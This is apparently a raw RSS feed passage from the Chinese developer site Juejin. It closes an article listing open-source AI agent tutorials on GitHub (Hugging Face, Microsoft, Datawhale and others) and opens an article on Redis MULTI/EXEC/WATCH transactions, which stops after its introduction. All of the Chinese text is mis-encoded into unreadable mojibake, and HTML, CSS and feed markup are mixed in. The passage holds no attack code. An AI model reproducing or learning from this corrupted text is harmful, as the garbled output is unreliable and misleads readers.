<p>è¿˜æ•™ä½ å¦‚ä½•è®© Agent æ‹¥æœ‰é•¿æœŸè®°å¿†ï¼›å®ç°å¤šæ™ºèƒ½ä½“åä½œ (Multi-Agent)ï¼›äº†è§£ RAG ä¸ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼Œè®© Agent ç²¾å‡†åˆ©ç”¨å¤–éƒ¨çŸ¥è¯†åº“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e992adf13001438a80e34d647c0aacde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=LWapZ%2FM%2BDI7QxF6eMwlu5apz5V0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/datawhalechina/hello-agents</span>
</code></pre>
<h2 data-id="heading-1">02ã€500+ æ™ºèƒ½ä½“æ¡ˆä¾‹</h2>
<p>500-AI-Agents-ProjectsÂ æ˜¯ GitHub ä¸Šä¸€ä¸ªæ¶µç›–äº†è¶…è¿‡ 500 ä¸ª AI Agent è½åœ°æ¡ˆä¾‹çš„è¶…çº§ç›®å½•ï¼Œæ–©è· 18k+ Starã€‚</p>
<p>ä¸çº¯ç²¹çš„ä»£ç æ•™ç¨‹ä¸åŒï¼Œå®ƒæ›´åƒæ˜¯ä¸€æœ¬è¡Œä¸šåº”ç”¨æŒ‡å—ï¼ŒæŒ‰åŒ»ç–—ã€é‡‘èã€æ•™è‚²ã€DevOps ç­‰å‚ç›´é¢†åŸŸå¯¹ Agent é¡¹ç›®è¿›è¡Œäº†è¯¦ç»†åˆ†ç±»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d8ccdbe42104cb5b3e79e887d708402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=Kptd7waeZ%2BwEQ9o0Py65OkaWECg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¼€æºé¡¹ç›®æ”¶å½•äº†å¤§é‡å¼€æºä»£ç å’Œå®é™…ç”¨ä¾‹ï¼Œæ— è®ºä½ æ˜¯æƒ³å¼€å‘ä¸€ä¸ªè‡ªåŠ¨åŒ–è¥é”€åŠ©æ‰‹ï¼Œè¿˜æ˜¯åŒ»ç–—è¯Šæ–­è¾…åŠ©ç³»ç»Ÿï¼Œéƒ½èƒ½åœ¨è¿™é‡Œæ‰¾åˆ°ç°æˆçš„å‚è€ƒæ¡ˆä¾‹ã€‚</p>
<p>å¸®åŠ©å¼€å‘è€…å’Œäº§å“ç»ç†è·³å‡ºèŠå¤©æœºå™¨äººçš„æ€ç»´å®šåŠ¿ï¼Œå‘ç° AI åœ¨ç»†åˆ†é¢†åŸŸçš„è½åœ°ã€‚</p>
<p>åŒ…æ‹¬Â CrewAIã€Autogenã€Agnoã€LanggraphÂ ç­‰ä¸»æµæ¡†æ¶çš„å®é™…åº”ç”¨ã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b262da028db4889be74554fe8e3191c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=I5RS5unp2ZwagRhba3RP%2BI2BJSk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚æœä½ æƒ³çŸ¥é“åˆ«äººéƒ½åœ¨ç”¨ AI Agent æä»€ä¹ˆï¼Œæˆ–è€…æƒ³åœ¨åŠ¨æ‰‹å¼€å‘å‰å‚è€ƒç°æœ‰çš„æœ€ä½³å®è·µä»¥é¿å…é‡å¤é€ è½®å­ï¼Œé‚£ä¹ˆæ¥è¿™ä¸ªä»“åº“ç§ç§å°±è¡Œäº†ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/ashishpatel26/500-AI-Agents-Projects</span>
</code></pre>
<h2 data-id="heading-2">03ã€æ™ºèƒ½ä½“èµ„æºåº“</h2>
<p>å›½å¤– AI æŠ€æœ¯åšä¸»Â <strong>Nir Diamant</strong>Â å¤§ä½¬å¼€æºçš„ï¼š<strong>GenAI_Agents</strong>ã€‚</p>
<p>é€šè¿‡æå…¶æ¸…æ™°çš„è·¯å¾„ï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ ä»é›¶æ„å»ºæ™ºèƒ½ä½“ã€‚æ±‡é›†äº†Â <strong>40 å¤šç§ä¸åŒåœºæ™¯çš„ AI æ™ºèƒ½ä½“å®ç°ï¼Œ</strong></p>
<p>æ— è®ºä½ æ˜¯æƒ³åšä¸€ä¸ªç®€å•çš„é—®ç­”æœºå™¨äººï¼Œè¿˜æ˜¯æƒ³åˆ©ç”¨å½“çº¢æ¡†æ¶Â <strong>LangGraph</strong>Â æ­å»ºå¤æ‚çš„ã€å…·å¤‡è®°å¿†å’Œè‡ªæˆ‘åæ€èƒ½åŠ›çš„å¤šæ™ºèƒ½ä½“ç³»ç»Ÿï¼Œè¿™é‡Œéƒ½æœ‰ç°æˆçš„æœ€ä½³å®è·µã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5002e0eed58f4210932255288228e99c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=6Nnep1GHL6sEVbTBZ43rhTtXMLw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªé¡¹ç›®æœ€å¤§çš„äº®ç‚¹åœ¨äºå®æˆ˜ä¸ºç‹ï¼ŒåŒ…å«äº†å¤§é‡å¯ç›´æ¥è¿è¡Œçš„ Jupyter Notebook æ•™ç¨‹ï¼Œè¦†ç›–äº†ä»å…¥é—¨åˆ°ç²¾é€šçš„å…¨æ–¹ä½åœºæ™¯ã€‚</p>
<p>é¡¹ç›®æŒ‰éš¾åº¦åˆ†çº§ï¼Œæ–°æ‰‹å¯ä»¥ä»åŸºç¡€å¯¹è¯ Agent å…¥æ‰‹ï¼Œé€æ­¥è¿›é˜¶åˆ°å¤æ‚çš„å¤šæ™ºèƒ½ä½“ç³»ç»Ÿæ¶æ„ã€‚</p>
<p>æ¯ä¸ªæ™ºèƒ½ä½“éƒ½æä¾›å®Œæ•´çš„å®ç°ä»£ç å’Œè¯¦ç»†è¯´æ˜ï¼Œä½ å¯ä»¥ç›´æ¥å…‹éš†é¡¹ç›®ï¼Œå¿«é€Ÿå¤ç°æ•ˆæœã€‚</p>
<p>é›†æˆäº†Â LangChainã€LangGraphã€AutoGen ç­‰ä¸»æµæ¡†æ¶ï¼Œä»¥åŠ MCP ç­‰å…ˆè¿›æŠ€æœ¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/NirDiamant/GenAI_Agents</span>
</code></pre>
<h2 data-id="heading-3">04ã€HFå¼€æºçš„ Agent æ•™ç¨‹</h2>
<p>Hugging Face å®˜æ–¹å¼€æºäº†ä»–ä»¬çš„æ™ºèƒ½ä½“è¯¾ç¨‹ï¼šAgents Courseã€‚</p>
<p>å½“ä½ å®Œæˆæ‰€æœ‰ç« èŠ‚å’Œ Final Project åï¼Œä½ è¿˜èƒ½è·å¾—ä¸€å¼ Â <strong>Hugging Face å®˜æ–¹é¢å‘çš„ç»“ä¸šè¯ä¹¦</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6faf174e6cab4db68ebce3795689466c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=%2FmlKaqcqRPfCNS%2Fr%2Fazi2As1CGU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘å‘ç° Hugging Face ç¡®å®æ˜¯åœ¨é€šè¿‡è¿™é—¨è¯¾æ¨å¹¿æ–°æ¡†æ¶Â smolagentsã€‚</p>
<p>ä»–ä»¬å‘ç°ç°åœ¨çš„ Agent å¼€å‘è¶Šæ¥è¶Šé‡äº†ï¼ŒåŠ¨ä¸åŠ¨å°±æ˜¯å¤æ‚çš„å›¾ã€å¤æ‚çš„ Chainã€‚å®ƒçš„æ ¸å¿ƒç†å¿µæ˜¯ï¼š<strong>Code Agents</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a6ea321eba348d4980f89fc3683a98f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=4T%2Bldjvo4%2BMvHjSBgWVxHbJruTk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç®€å•è¯´ï¼Œ<strong>è®© LLM ç›´æ¥å†™ Python ä»£ç æ¥è§£å†³é—®é¢˜</strong>ï¼Œè€Œä¸æ˜¯è®©å®ƒè¾“å‡ºä¸€å †å¤æ‚çš„ JSON æ ¼å¼å»è°ƒç”¨å·¥å…·ã€‚</p>
<p>è¿™ç§æ–¹å¼æ›´ç›´è§‚ã€æ›´å¼ºå¤§ï¼Œè€Œä¸”ä»£ç é‡åªæœ‰å…¶ä»–æ¡†æ¶çš„å‡ åˆ†ä¹‹ä¸€ã€‚è¿™é—¨è¯¾ä¼šå¸¦ä½ æŒæ¡è¿™ç§å°è€Œç¾çš„å¼€å‘æ–¹å¼ã€‚</p>
<p>åŒæ ·çš„ï¼Œè¿™ä¸ª Agents é¡¹ç›®ä¹ŸåŒ…å«æå…¶æœ‰è¶£çš„å®æˆ˜æ¡ˆä¾‹ï¼Œæ•™ä½ è®­ç»ƒä¸€ä¸ªèƒ½ç©å®å¯æ¢¦æ¸¸æˆçš„æ™ºèƒ½ä½“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/685f48cb3d764e4cbe50bcc84085a8ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=p3cyFDMuGm5V%2B2lEI52Z2tQ9khc%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>ä¾æ‰˜äº Hugging Face å¼ºå¤§çš„ç”Ÿæ€ï¼Œè¿™é—¨è¯¾æ‰€æœ‰çš„ç»ƒä¹ éƒ½å¯ä»¥åœ¨Â Hugging Face SpacesÂ ä¸Šç›´æ¥è¿è¡Œã€‚</p>
<p>ä½ ç”šè‡³ä¸éœ€è¦è‡ªå·±åœ¨æœ¬åœ°é…ç¯å¢ƒï¼Œæµè§ˆå™¨ç‚¹å¼€å°±èƒ½è·‘ï¼Œè¿˜èƒ½ç›´æ¥ç”¨ HF æä¾›çš„å…è´¹ Inference APIã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/huggingface/agents-course</span>
</code></pre>
<h2 data-id="heading-4">05ã€å¾®è½¯å¼€æºçš„ Agents æ•™ç¨‹</h2>
<p>ç»§ã€Šæœºå™¨å­¦ä¹ å…¥é—¨ã€‹ã€ã€Šç”Ÿæˆå¼ AI å…¥é—¨ã€‹ç­‰ç¥çº§æ•™ç¨‹ç«éå…¨çƒåï¼Œ<strong>å¾®è½¯ä¹Ÿå¯¹ Agent ä¸‹æ‰‹äº†ã€‚</strong></p>
<p><strong>å¾®è½¯æ¨å‡ºçš„ AI Agents for Beginners</strong>Â å·²ç»Â 5 ä¸‡çš„ StarÂ </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/846d1d3f5f5942b6986b2b722dce2e38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=p5eIOwaM0cLR99%2FY2tdHg%2FfJ0hc%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯é¢å‘åˆå­¦è€…çš„ 10 èŠ‚æ™ºèƒ½ä½“å¼€å‘è¯¾ç¨‹ï¼Œä¸åŒäºå¸‚é¢ä¸Šé›¶æ•£çš„æ•™ç¨‹ï¼Œå¾®è½¯æŠŠ<strong>ä¼ä¸šçº§å¼€å‘</strong>ä¸­éªŒè¯è¿‡çš„æ¨¡å¼å’Œæ¡†æ¶ï¼Œé€šè¿‡ 10 èŠ‚å¾ªåºæ¸è¿›çš„è¯¾ç¨‹ï¼Œæ‰‹æŠŠæ‰‹æ•™ç»™ä½ ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a7b40282bc243178f4d40027a0f3580~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=UJnMog5uF6V35TUS7ODZwhiC7Zo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªè¯¾ç¨‹ä¼šå­¦ä¹ å¾®è½¯ä¸»æ¨çš„ SDKÂ Semantic Kernelï¼Œä¸“æ³¨äºå°†å¤§æ¨¡å‹é›†æˆåˆ°ç°æœ‰ä»£ç ä¸­ï¼Œä¼ä¸šçº§åº”ç”¨çš„é¦–é€‰ã€‚è¿˜ä¼šåº”ç”¨å¤„ç†å¤æ‚ Multi-Agent åä½œçš„å¼€æºæ¡†æ¶Â AutoGenã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/381faafaa7b744c3864c4a35596ac6c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=nJYb6OondjScKNStkoyXOaTPtvk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/microsoft/ai-agents-for-beginners</span>
</code></pre>
<h2 data-id="heading-5">06ã€6å‘¨å­¦ä¼šAIæ™ºèƒ½ä½“</h2>
<p>è¯¾ç¨‹å¯¼å¸ˆæ˜¯ Ed Donner ï¼Œé€šè¿‡ä¸ºæœŸÂ <strong>6 å‘¨</strong>çš„å®è·µå­¦ä¹ ï¼Œå¼•å¯¼ä½ æŒæ¡å¦‚ä½•æ„å»ºå’Œéƒ¨ç½²è‡ªä¸» AI æ™ºèƒ½ä½“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daa7441fe1dd4238a3f5b4973a3542ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=vvLyG2jo06AnodHaZPFdsZlNWKM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¯¥é¡¹ç›®æœ€å¤§çš„ä»·å€¼åœ¨äºå…¨æ¡†æ¶è¦†ç›–<strong>ä¸</strong>å‰æ²¿æŠ€æœ¯è·Ÿè¿›ã€‚å®ƒä¸ä»…æ¨ªå‘å¯¹æ¯”å¹¶å®æˆ˜äº†Â OpenAI Agents SDKã€CrewAIã€LangGraphã€AutoGenÂ å››å¤§ä¸»æµæ¡†æ¶ï¼Œè¿˜ç‡å…ˆæ¶µç›–äº†æœ€æ–°çš„Â <strong>MCP</strong>ã€‚è€Œä¸”ä½ å¯ä»¥ç›´æ¥åœ¨ Cursor é‡Œé¢å­¦è¿™ä¸ªè¯¾ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fb56bde49b346da9e97710dfb2015cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=RjXl9bUJhA%2Ff1xf0aiTOpS2TdPM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/ed-donner/agents</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redisäº‹åŠ¡æœºåˆ¶æ·±åº¦å‰–æï¼šMULTIã€EXECä¸WATCHå‘½ä»¤å®æˆ˜]]></title>    <link>https://juejin.cn/post/7581698635866701850</link>    <guid>https://juejin.cn/post/7581698635866701850</guid>    <pubDate>2025-12-10T02:38:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698635866701850" data-draft-id="7490815158190145562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redisäº‹åŠ¡æœºåˆ¶æ·±åº¦å‰–æï¼šMULTIã€EXECä¸WATCHå‘½ä»¤å®æˆ˜"/> <meta itemprop="keywords" content="Redis,æ•°æ®åº“,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-12-10T02:38:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Goé«˜å¹¶å‘æ¶æ„_ç‹å·¥"/> <meta itemprop="url" content="https://juejin.cn/user/446863555701561"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redisäº‹åŠ¡æœºåˆ¶æ·±åº¦å‰–æï¼šMULTIã€EXECä¸WATCHå‘½ä»¤å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/446863555701561/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Goé«˜å¹¶å‘æ¶æ„_ç‹å·¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:38:14.000Z" title="Wed Dec 10 2025 02:38:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»25åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ–‡ç« æ‘˜è¦ï¼ˆ200-300å­—ï¼‰</h2>
<p>Redis ä½œä¸ºä¸€æ¬¾é«˜æ€§èƒ½çš„å†…å­˜æ•°æ®åº“ï¼Œä»¥å…¶æè‡´çš„é€Ÿåº¦å’Œçµæ´»çš„æ•°æ®ç»“æ„å¹¿å—å¼€å‘è€…é’çã€‚ç„¶è€Œï¼Œåœ¨å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¦‚ä½•ä¿è¯æ•°æ®ä¸€è‡´æ€§æˆä¸ºä¸€ä¸ªç»•ä¸å¼€çš„è¯é¢˜ã€‚Redis çš„äº‹åŠ¡æœºåˆ¶é€šè¿‡ <code>MULTI</code>ã€<code>EXEC</code> å’Œ <code>WATCH</code> å‘½ä»¤ï¼Œæä¾›äº†ä¸€ç§è½»é‡çº§çš„è§£å†³æ–¹æ¡ˆï¼Œè™½ç„¶å®ƒä¸åƒä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“é‚£æ ·æ”¯æŒå®Œæ•´çš„äº‹åŠ¡ç‰¹æ€§ï¼Œå´åœ¨ç‰¹å®šåœºæ™¯ä¸‹å±•ç°å‡ºç‹¬ç‰¹ä¼˜åŠ¿ã€‚æœ¬æ–‡æ—¨åœ¨æ·±å…¥å‰–æ Redis äº‹åŠ¡çš„æ ¸å¿ƒåŸç†ï¼Œå¸®åŠ©è¯»è€…ç†è§£å…¶å·¥ä½œæœºåˆ¶ã€é€‚ç”¨åœºæ™¯ä»¥åŠæ½œåœ¨å±€é™ã€‚æ— è®ºæ˜¯ä½¿ç”¨ <code>MULTI</code> å’Œ <code>EXEC</code> å®ç°åŸå­æ“ä½œï¼Œè¿˜æ˜¯å€ŸåŠ© <code>WATCH</code> å®ç°ä¹è§‚é”å¹¶å‘æ§åˆ¶ï¼Œæˆ‘ä»¬éƒ½å°†ç»“åˆå®é™…é¡¹ç›®ç»éªŒï¼Œè¾…ä»¥ä»£ç ç¤ºä¾‹å’Œè¸©å‘æ•™è®­ï¼Œå¸¦ä½ ä»åŸºç¡€èµ°å‘å®æˆ˜ã€‚æ–‡ç« ç‰¹è‰²åœ¨äºï¼šä¸ä»…è®²è§£æŠ€æœ¯ç»†èŠ‚ï¼Œè¿˜åˆ†äº«äº†ä½œè€…åœ¨è®¢å•å¤„ç†ã€åº“å­˜æ‰£å‡ç­‰åœºæ™¯ä¸­çš„å®æˆ˜å¿ƒå¾—ï¼ŒåŠ›æ±‚è®©æ¯ä¸€ä½æœ‰ 1-2 å¹´ Redis ç»éªŒçš„å¼€å‘è€…éƒ½èƒ½å¿«é€Ÿä¸Šæ‰‹å¹¶ä¼˜åŒ–è‡ªå·±çš„é¡¹ç›®ã€‚æ— è®ºä½ æ˜¯æƒ³æå‡æŠ€èƒ½ï¼Œè¿˜æ˜¯è§£å†³å®é™…é—®é¢˜ï¼Œè¿™ç¯‡æ–‡ç« éƒ½å°†æ˜¯ä½ çš„å¾—åŠ›åŠ©æ‰‹ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€å¼•è¨€ï¼ˆçº¦400-500å­—ï¼‰</h2>
<h3 data-id="heading-2">1. Redisäº‹åŠ¡çš„èƒŒæ™¯ä¸ä»·å€¼</h3>
